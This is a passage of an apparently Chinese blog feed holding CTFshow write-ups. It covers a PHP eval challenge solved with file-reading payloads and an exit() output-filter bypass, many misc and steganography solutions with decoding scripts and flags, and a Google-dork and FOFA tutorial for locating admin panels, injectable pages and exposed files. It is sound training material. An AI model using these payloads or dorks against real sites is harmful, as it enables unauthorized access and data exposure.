punctuation">{</span><span class="token keyword">echo</span> <span class="token variable">$key</span><span class="token punctuation">.</span><span class="token string">"=>"</span><span class="token punctuation">.</span><span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后利用：</p><pre class="line-numbers language-php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 你们在炫技吗？</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="函数解释："><a href="#函数解释：" class="headerlink" title="函数解释："></a>函数解释：</h3><p>ob_get_contents — 返回输出缓冲区的内容</p><h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><p>string <strong>ob_get_contents</strong>    ( void   )</p><p>只是得到输出缓冲区的内容，但不清除它。   </p><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>此函数返回输出缓冲区的内容，或者如果输出缓冲区无效将返回<strong><code>FALSE</code></strong> 。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//打开输出控制缓冲</span><span class="token keyword">echo</span> <span class="token string">"Hello "</span><span class="token punctuation">;</span><span class="token variable">$out1</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"World"</span><span class="token punctuation">;</span><span class="token variable">$out2</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$out1</span><span class="token punctuation">,</span> <span class="token variable">$out2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上例程会输出：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">string</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token string">"Hello "</span><span class="token function">string</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token string">"Hello World"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</p><h4 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h4><p>bool <strong>ob_end_clean</strong>    ( void   )</p><p>此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在<strong>ob_end_clean()</strong>之前调用ob_get_contents()，因为当调用<strong>ob_end_clean()</strong>时缓冲区内容将被丢弃。    </p><h4 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h4><p>   成功时返回 <strong><code>TRUE</code></strong>， 或者在失败时返回 <strong><code>FALSE</code></strong>。 错误的原因首先是，在调用时没有一个起作用的缓冲区，或者是因为某些原因缓冲区不能被删除（可能对特殊缓冲区而言）。 </p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'Text that won\'t get displayed.'</span><span class="token punctuation">;</span><span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>并不会有输出结果</p><p>这道题目这么做的目的，重在体现将整个后面的代码全部截断，因为这个东西针对的是所有的输出流，只要填吗存在那么我们获取到输出执行的结果中的数字和字母将全是问号</p><h3 id="payload：-13"><a href="#payload：-13" class="headerlink" title="payload："></a>payload：</h3><pre class="line-numbers language-php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token variable">$key</span><span class="token punctuation">.</span><span class="token string">"=>"</span><span class="token punctuation">.</span><span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">}</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h2>]]></content>
      
      
      <categories>
          
          <category> CTFshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息泄露 </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow之misc</title>
      <link href="/2021/01/24/ctfshow-zhi-misc/"/>
      <url>/2021/01/24/ctfshow-zhi-misc/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1300994613&auto=1&height=66"></iframe><h1 id="2021-01-24"><a href="#2021-01-24" class="headerlink" title="2021-01-24"></a>2021-01-24</h1><h2 id="大吉大利杯"><a href="#大吉大利杯" class="headerlink" title="大吉大利杯"></a>大吉大利杯</h2><h3 id="请问大吉杯的签到是在这里签吗"><a href="#请问大吉杯的签到是在这里签吗" class="headerlink" title="请问大吉杯的签到是在这里签吗"></a>请问大吉杯的签到是在这里签吗</h3><p>得到二维码1.png</p><p>通过foremost分离得到另外3个</p><p>内容分别是：</p><p>1：请问DJB CTF比赛的签到处在什么地方</p><p>2：还要往前走……是不是在这个路口转弯呢?<br>3：好像没有岔路了，一直往前走试试看<br>4：咦，这是死胡同，是不是哪里走错路了</p><p>关键的地方在2.png，用stegsolve，<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8824%E6%97%A52307_1.png" alt></p><p>得到图案，对比发现是猪圈密码，对照解码得到flag：<br>flag{dajiadoaidjb}</p><h3 id="十八般兵器"><a href="#十八般兵器" class="headerlink" title="十八般兵器"></a>十八般兵器</h3><p>顺序：刀、枪、剑、戟、斧、钺、钩、叉、鞭、锏、锤、戈、镋、棍、槊、棒、矛、耙</p><p>下载得到rar文件，打开得到批注是：2021牛年大吉，这个就是解压密码</p><p>hint1:JPHS<br>hint2:用Notepad++打开试试？<br>hint3:前十种兵器对应10进制，后八种对应8进制</p><p>用jphswin打开，用seek，将棒.jpg保存，得到txt文本，下拉到最后得到34635</p><p>将18个兵器后面藏的数字一次写下来，并且按照题目给的顺序排列。再加上提示说前10个是10进制，后8个是8进制，可以得到两组数字：</p><p>1361 4399 9223 1635 2581 7639 7978 5870 0963 935 30440 53720 46055 62766 10613 34635 37242 30575<br>两组分别合并 得到<br>136143999223163525817639797858700963935<br>3044053720460556276610613346353724230575</p><p>16进制：</p><p>666c61677b43544673686f775f31305f</p><p>62415f42616e5f62316e675f51317d</p><p>666c61677b43544673686f775f31305f62415f42616e5f62316e675f51317d</p><p>16→text：flag{CTFshow_10_bA_Ban_b1ng_Q1}</p><h1 id="2021-02-08"><a href="#2021-02-08" class="headerlink" title="2021-02-08"></a>2021-02-08</h1><h2 id="杂项签到"><a href="#杂项签到" class="headerlink" title="杂项签到"></a>杂项签到</h2><p>伪加密flag{79ddfa61bda03defa7bfd8d702a656e4}</p><h2 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h2><p>hint：偶然发现我竟然还有个软盘，勾起了我的回忆。</p><p>下载得到file文件（没有后缀），可以通过file file命令查看文件类型</p><pre><code>file: DOS/MBR boot sector, code offset 0x4e+2, OEM-ID &quot;CTF.SHOW&quot;, root entries 224, sectors 2880 (volumes &lt;=32 MB), sectors/FAT 9, sectors/track 18, sectors 2880 (volumes &gt; 32 MB), serial number 0xffffffff, label: &quot;flagnothere&quot;, FAT (12 bit by descriptor+sectors), followed by FAT</code></pre><p>dos：磁盘操作系统</p><p>1.44MB软盘使用的FAT文件系统通常为FAT12，根据<a href="https://zhuanlan.zhihu.com/p/121807427" target="_blank" rel="noopener">FAT12的MBR引导记录结构</a>，第54字节开始的8位应固定为FAT12。而该文件中被修改成了FAT11，需要进行修复。<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B402%E6%9C%8808%E6%97%A51923_1.png" alt></p><p>11改为12，31改为32，然后新建虚拟机，载入file软盘镜像文件，启动虚拟机就会得到：flag{ctfshow}</p><h2 id="miscx"><a href="#miscx" class="headerlink" title="miscx"></a>miscx</h2><p>得到加密压缩包，其中有注释：1.2020快乐！2.rat？or？还有未加密文件misc.png，用hxd打开在字符串最后得到flag{flag_1s_n0t_h3r3}但是不是misc1的密码，密码其实是图片本身：2020！得到</p><pre><code>♭‖♭‖‖♯♭♭♬‖♩♫‖♬∮♭♭¶♭‖♯‖¶♭♭‖∮‖‖♭‖§♭‖♬♪♭♯§‖‖♯‖‖♬‖‖♪‖‖♪‖¶§‖‖♬♭♯‖♭♯♪‖‖∮‖♬§♭‖‖‖♩♪‖‖♬♭♭♬‖♩♪‖♩¶‖♩♪‖♩♬‖¶§‖‖♩‖¶♫♭♭♩‖♬♯‖♬§♭‖♭‖♩¶‖‖∮♭♭♬‖‖♭‖♫§‖¶♫‖♩∮♭♭§‖♭§‖♭§§=</code></pre><p>根据特征判断出是音乐符号加密使用<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue" target="_blank" rel="noopener">这个在线加密工具</a>加密的，解密得到：</p><pre><code>U2FsdGVkX1/eK2855m8HM4cTq8Fquqtm6QDbcUu4F1yQpA==</code></pre><p>base64再解码：乱码，无法解码</p><p>提示2：rat？or？</p><p>rabbit再解密（key=2020）：</p><pre><code>welcome_to_payhelp</code></pre><p>（这个payhelp是一个单身交友平台）</p><p>ok开始进攻misc2hint密码就是上面得到的，解开得(base64解密后)：</p><pre><code>welcome_to_2020%0Aflag%20is%20coming...%0Athe%20key%20is%20hello%202020%217</code></pre><p>URL解码得：</p><pre><code>welcome_to_2020flag is coming...the key is hello 2020!</code></pre><p>flag{g00d_f0r_y0u}</p><h2 id="misc50"><a href="#misc50" class="headerlink" title="misc50"></a>misc50</h2><p>png文件3.05mb，hxd打开在字符串末尾得到</p><pre><code>Sk5DVlM2Mk1NRjVIU1gyTk1GWEgyQ1E9Cg==</code></pre><p>base64处理：</p><pre><code>JNCVS62MMF5HSX2NMFXH2CQ=</code></pre><p>base32处理：</p><pre><code>KEY{Lazy_Man}</code></pre><p>然后直接后缀改为zip，得到fbi.rar打开得到flag.zip和注释GEZDGNBVGYFA====</p><p>base32处理得到：123456</p><p>输入密码123456得到文本文件：thienc.txt|打开得到10.3M的数字，且3078重复出现，3078进行16进制解码后得到0x也就是说都是16进制编码，于是需要：批量删除0x，将剩下的转换为16进制，又因为3337==&gt;37,3761==&gt;7a</p><pre><code> {&quot;扩展名&quot;:&quot;7z&quot;,&quot;文件头标识（HEX）&quot;:&quot;377ABCAF271C&quot;,&quot;文件描述&quot;:&quot;7-ZIPcompressedfile&quot;}</code></pre><p><a href="https://zhuanlan.zhihu.com/p/158980459" target="_blank" rel="noopener">点击此处查看更多</a>文件头</p><p>也就是说最后要变为7z的压缩包，大佬脚本（此脚本可一步到位得到的test.txt以16进制文本的形式粘贴到010然后保存格式为）：</p><pre><code>import redef read_file(filepath):    with open(filepath) as fp:        content=fp.read();    return contentnumber = read_file(&#39;1.txt&#39;)result = []result.append(re.findall(r&#39;.{2}&#39;, number))result = result[0]strings =&#39;&#39;for i in result:    y = bytearray.fromhex(i)    z = str(y)    z= re.findall(&quot;b&#39;(.*?)&#39;&quot;,z)[0]    strings += zb= strings.split(&#39;0x&#39;)strings=&#39;&#39;for i in b:    if len(i) ==1:        i= &#39;0&#39; + i    strings +=iwith open(&#39;test.txt&#39;, &#39;w&#39;) as f:    f.write(strings)</code></pre><p>得带的7z压缩包解压密码：KEY{Lazy_Man}</p><p>用base3件套脚本跑失败。</p><p>转用脚本针对32和64的循环解码脚本（坑：脚本名字不可以和你要导入的模板重名，否则会导入失败）</p><p>这里用base64和32件套的脚本原因是针对开头部分加密字符串进行解密然后判断，以下是脚本（亲测可行）：</p><pre><code>import base64import ref = open(&#39;C:/Users/Administrator/Desktop/secenc.txt&#39;).read().encode(&#39;utf-8&#39;)while True:    if re.match(&#39;^[2-7A-Z=]+$&#39;, f.decode(&#39;utf-8&#39;)):        f = base64.b32decode(f)    elif re.match(&#39;^[0-9a-zA-Z+/=]+$&#39;, f.decode(&#39;utf-8&#39;)):        f = base64.b64decode(f)    else:        print(f.decode(&#39;utf-8&#39;))        break</code></pre><p>得到以！.？组成的加密文件，是简化形式的Ook!，在线工具运行得到（无删减）：</p><pre><code>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;.&lt; +++[- &gt;+++&lt; ]&gt;+++ ++.+++++++ .---- ----- .&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;--. &lt;++++ +++[- &gt;++++ +++&lt;]&gt;++++ +++++ +++.- ----- --.-- ----. &lt;++++ [-&gt;++ ++&lt;]&gt; +++++ .&lt;+++ +++[-&gt;---- --&lt;]&gt; -.&lt;++ ++[-&gt; ++++&lt; ]&gt;.++ ++.&lt;+ ++[-&gt; ---&lt;] &gt;---- --.&lt;+ +++[-&gt;++++ &lt;]&gt;++ .---- ---.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- ----- -.&lt;++ +++++ [-&gt;+++++++ &lt;]&gt;++ ++.++ +++++ .++++ ++++. &lt;++++ +++++ [-&gt;-- ----- --&lt;]&gt; -----.&lt;+++ +++++ +[-&gt;+ +++++ +++&lt;] &gt;++++ +++++ ++.&lt;</code></pre><p>brainfuck解码：flag{Welc0me_tO_cTf_3how!}</p><p>题外话：不得不说，ctfshow的misc比buuctf有搞头</p><h1 id="2021-02-09"><a href="#2021-02-09" class="headerlink" title="2021-02-09"></a>2021-02-09</h1><h2 id="misc30"><a href="#misc30" class="headerlink" title="misc30"></a>misc30</h2><p>rar压缩包内三个文件</p><p>先从未加密的星空jpg开始，右键属性，详细信息得到：</p><pre><code>little stars</code></pre><p>解开眼见不一定为实.doc的密码，里面是word隐写，全选后改变颜色字体得到：</p><pre><code>你知道梵高的星空吗？Hello friend!</code></pre><p>利用其解开flag.png得到二维码利用软件cqr得到flag{welcome_to_ctfshow}</p><h2 id="stega1"><a href="#stega1" class="headerlink" title="stega1"></a>stega1</h2><p>题如其名stego隐写（failed）</p><p>winhex（failed）</p><p>jphs中的seek(success)：密码为空，保存文件为txt</p><h2 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h2><p><strong>密文：zse4rfvsdf 6yjmko0</strong></p><p><strong>提示1：解密后两个字符,小写 提示2：看看自己下面</strong></p><p><strong>提交flag{明文}</strong></p><p>键盘密码：av</p><h2 id="misc40"><a href="#misc40" class="headerlink" title="misc40"></a>misc40</h2><p>加密文件：svega.wav</p><p>未加密文件：svega.mp3，conversion.txt，一张普通的二维码.png</p><p>conversion.txt利用过程：</p><p>文本内容：</p><pre><code>1100010101000111012&gt;4&gt;8&gt;10</code></pre><p>看最后一行应该是2进制转4转8转10，2直接转10就行得到结果：202013，使mp3可以解码</p><p>二维码利用过程：</p><p>winhex打开得到brainfuck加密，解码得：</p><p>和谐民主和谐文明和谐和谐和谐自由和谐平等和谐公正</p><p>再解码得：123456，但是没用上。</p><p>MP3利用过程：</p><p>考虑得到的mp3，使用mp3stego后得到文件：svega.mp3.pcm</p><pre><code>选项:-X 提取隐藏数据-P&lt;text&gt; 用于嵌入的密码短语-A 写一个AIFF输出的脉码调制声音文件-s &lt;sb &gt; 仅适用于此sb(仅调试)inputBS 输入编码音频的输入比特流outPCM 输出PCM输出PCM声音文件(dflt inputBS+.aif|.pcm)outhidden 输出隐藏文本文件(dflt inputBS+.txt)</code></pre><p>这里需要-P 123456不然只会得到svega.mp3.pcm：</p><pre><code>hint：静默之眼对了~另一个音乐的密码是abc123哦你马上就成功了！</code></pre><p>咱也不知道静默之眼是什么东西。。。原来叫sileneye隐写工具，根据进制转换得到的密码202013解密wav文件：flag{C0ngr4tul4ti0n!}</p><h1 id="2021-02-10"><a href="#2021-02-10" class="headerlink" title="2021-02-10"></a>2021-02-10</h1><h2 id="misc30-1"><a href="#misc30-1" class="headerlink" title="misc30"></a>misc30</h2><p>得到aihe.mp3，mp3stego尝试（凉），foremost跑一些得到图片，修改高度，得到猪圈密码，解密得：well done</p><p>flag{well done}</p><h2 id="红包题第一弹"><a href="#红包题第一弹" class="headerlink" title="红包题第一弹"></a>红包题第一弹</h2><p>打开得到86个zip文件，直接86个图片，尝试解压几张图片，并用十六进制编辑器查看，发现末尾均有额外数据，基本就是base64。</p><p>脚本介绍：按文件名顺序依次将压缩包解压得到图片，并提取图片末尾的字符串后拼接：</p><pre><code>import zipfilepath1 = &#39;C:/Users/Administrator/Desktop/flag/&#39;path2 = &#39;C:/Users/Administrator/Desktop/flag/out/&#39;res = &#39;&#39;for i in range(1, 87):    zip = zipfile.ZipFile(path1 + str(i) + &#39;.zip&#39;)    jpg = str(i) + &#39;.jpg&#39;    zip.extract(jpg, path2)    zip.close()    f = open(path2 + jpg, &#39;rb&#39;).read()    res += f[len(f)-100:len(f)+1].decode(&#39;utf-8&#39;)print(res)</code></pre><p><strong>关于base64编码的图片base64的开头为iVBOR…</strong>此处就是，所以文件头就加上<strong>data:image/png;base64,</strong>然后base64转图片得到二维码得：flag{gif_is_so_easy}</p><h2 id="stega10"><a href="#stega10" class="headerlink" title="stega10"></a>stega10</h2><p>得到文件heart.jpg，winhex或者用命令strings heart.jpg得：aHR0cHM6Ly93d3cubGFuem91cy5jb20vaTliMGtzZA</p><p>base64解码处理：</p><p><a href="https://www.lanzous.com/i9b0ksd" target="_blank" rel="noopener">https://www.lanzous.com/i9b0ksd</a></p><p>下载得到压缩包，其中密码文件夹内包含9个1字节长的txt文件，通过CRC32爆破的方法得到9个txt文件的内容：</p><pre><code>import zipfileimport stringimport binasciicrc = []zip = zipfile.ZipFile(&#39;C:/Users/Administrator/Desktop/flag.zip&#39;, &#39;r&#39;)for i in zip.namelist():    crc += [zip.getinfo(i).CRC]crc = crc[1:10]for i in range(9):    for j in string.printable:        c = binascii.crc32(j.encode(&#39;utf-8&#39;))        if c == crc[i]:            print(j, end = &#39;&#39;)</code></pre><p>得到：447^*5#)7</p><p>作为密码输入得到n.png，winhex打开，发现文件被倒着写了，脚本：</p><pre><code>f = open(&#39;C:/Users/Administrator/Desktop/n.png&#39;, &#39;rb&#39;).read()res = open(&#39;C:/Users/Administrator/Desktop/n2.png&#39;, &#39;wb&#39;)res.write(f[::-1])</code></pre><p>得到二维码扫码得到：flag{我好难啊}</p><h2 id="stega11"><a href="#stega11" class="headerlink" title="stega11"></a>stega11</h2><p>常规知识普及一下<br>jpg的文件头，FF D8<br>jpg的文件尾, FF D9</p><p>我们搜索FF D9，在第一个结果后，发现base32密文：</p><pre><code>MZWGCZ33GZTDCNZZG5SDIMBYGBRDEOLCGY2GIYJVHA4TONZYGA2DMM3FGMYH2</code></pre><p>base32解码得：</p><p>flag{6f1797d4080b29b64da5897780463e30}</p>]]></content>
      
      
      <categories>
          
          <category> CTFshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> CTFshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搜索语法</title>
      <link href="/2021/01/18/sou-suo-yu-fa/"/>
      <url>/2021/01/18/sou-suo-yu-fa/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1808492017&auto=1&height=66"></iframe><h1 id="一、谷歌语法是什么"><a href="#一、谷歌语法是什么" class="headerlink" title="一、谷歌语法是什么"></a>一、谷歌语法是什么</h1><p>谷歌语法就是利用搜索引擎在渗透测试过程搜索到特定页面的一种语法</p><h1 id="二、如何利用谷歌语法"><a href="#二、如何利用谷歌语法" class="headerlink" title="二、如何利用谷歌语法"></a>二、如何利用谷歌语法</h1><h2 id="谷歌语法基础的符号："><a href="#谷歌语法基础的符号：" class="headerlink" title="谷歌语法基础的符号："></a>谷歌语法基础的符号：</h2><p><strong>“xxx”: 将要搜索的关键字用引号括起来  (表示完全匹配，即关键词不能分开，顺序也不能变)</strong></p><p>例如：腾讯课堂如果不加“ ”的话，就会针对腾讯和课堂进行拆分，既对腾讯进行搜索也对课堂进行搜索，所以加上“ ”的话就会对腾讯课堂进行绑定，只对腾讯课堂进行搜索</p><p><strong>+：“xxx” +baidu.com</strong> </p><p>  <strong>搜索xxx与baidu.com 相关的内容</strong></p><p>例如：腾讯课堂 +ke.qq.com，那么这里就会显示ke.qq.com相关的内容</p><p><strong>-：“xxx” -baidu.com</strong> </p><p>  <strong>搜索结果里面除去baidu.com 相关的内容</strong></p><p>例如：腾讯课堂 -ke.qq.com，这里再搜索的时候，就会把这个网址屏蔽掉</p><h2 id="谷歌语法的基础使用"><a href="#谷歌语法的基础使用" class="headerlink" title="谷歌语法的基础使用"></a>谷歌语法的基础使用</h2><p>在渗透测试的过程中，运用谷歌语法能快速地帮我们找到可能存在漏洞的页面</p><h3 id="谷歌语法常用搜索参数："><a href="#谷歌语法常用搜索参数：" class="headerlink" title="谷歌语法常用搜索参数："></a>谷歌语法常用搜索参数：</h3><h4 id="site："><a href="#site：" class="headerlink" title="site："></a>site：</h4><p>指定域名，如：site:edu.cn 搜索教育网站</p><h4 id="inurl："><a href="#inurl：" class="headerlink" title="inurl："></a>inurl：</h4><p>用于搜索包含的url关键词的网页，如：inurl:uploads 文件上传，搜索关于公司有关的网址中含有login的网页，</p><h4 id="intitle："><a href="#intitle：" class="headerlink" title="intitle："></a>intitle：</h4><p>搜索网页标题中的关键字，如：</p><p>intitle:”index of /admin” robots.txt </p><p>intitle:”robots.txt”</p><h4 id="intext："><a href="#intext：" class="headerlink" title="intext："></a>intext：</h4><p>搜索网页正文中的关键字，如：intext:登陆/注册/用户名/密码</p><h4 id="filetype："><a href="#filetype：" class="headerlink" title="filetype："></a>filetype：</h4><p>按指定文件类型即文件后缀名搜索，如：filetpye:php/asp/jsp</p><h4 id="cache："><a href="#cache：" class="headerlink" title="cache："></a>cache：</h4><p>已经删除的缓存网页，推荐组合使用</p><h2 id="谷歌语法拓展"><a href="#谷歌语法拓展" class="headerlink" title="谷歌语法拓展"></a>谷歌语法拓展</h2><h3 id="查找后台"><a href="#查找后台" class="headerlink" title="查找后台"></a>查找后台</h3><p>site:xx.com intext:管理|后台|登陆|用户名|密码|系统|帐号|admin|login|sys|managetem|password|username </p><p>site:xx.com inurl:login|admin|manage|member|admin_login|login_admin|system|login|user</p><h3 id="查找sql注入漏洞"><a href="#查找sql注入漏洞" class="headerlink" title="查找sql注入漏洞"></a>查找sql注入漏洞</h3><p>inurl:.php?id=23 公司</p><p>inurl:.asp?id=11</p><h3 id="查找上传点："><a href="#查找上传点：" class="headerlink" title="查找上传点："></a>查找上传点：</h3><p>site:xx.com inurl:file| uploadfile</p><h3 id="查找敏感信息泄露"><a href="#查找敏感信息泄露" class="headerlink" title="查找敏感信息泄露"></a>查找敏感信息泄露</h3><p>intitle:”Index of /admin”</p><p>intitle:”Index of /root”</p><p>intitle:”Index of /“ +password.txt</p><p>intitle:phpinfo()或者inurl:phpinfo.php</p><h3 id="查找未授权访问phpmyadmin"><a href="#查找未授权访问phpmyadmin" class="headerlink" title="查找未授权访问phpmyadmin"></a>查找未授权访问phpmyadmin</h3><p>inurl:.php? intext:CHARACTER_SETS,COLLATIONS, ?intitle:phpmyadmin</p><h2 id="三、网络空间搜索引擎的使用"><a href="#三、网络空间搜索引擎的使用" class="headerlink" title="三、网络空间搜索引擎的使用"></a>三、网络空间搜索引擎的使用</h2><h3 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h3><p>FOFA 是白帽汇推出的一款网络空间搜索引擎,它通过进行网络空间测绘,能够帮助研究人员或者企业迅速进行网络资产匹配,例如进行漏洞影响范围分析、应用分布统计、应用流行度等。</p><p>FOFA 搜索引擎检索到的内容主要是服务器，数据库，某个网站管理后台，路由器，交换机，公共IP的打印机，网络摄像头，门禁系统，Web服务 ……</p><p>网址：<a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a></p><h3 id="FOFA怎么用？"><a href="#FOFA怎么用？" class="headerlink" title="FOFA怎么用？"></a>FOFA怎么用？</h3><p>FOFA查询语法，类似谷歌语法，FOFA的语法也是简单易懂，主要分为检索字段以及运算符，所有的查询语句都是由这两种元素组成的。</p><p>常用语法：</p><p>1、domain= “qq.com”    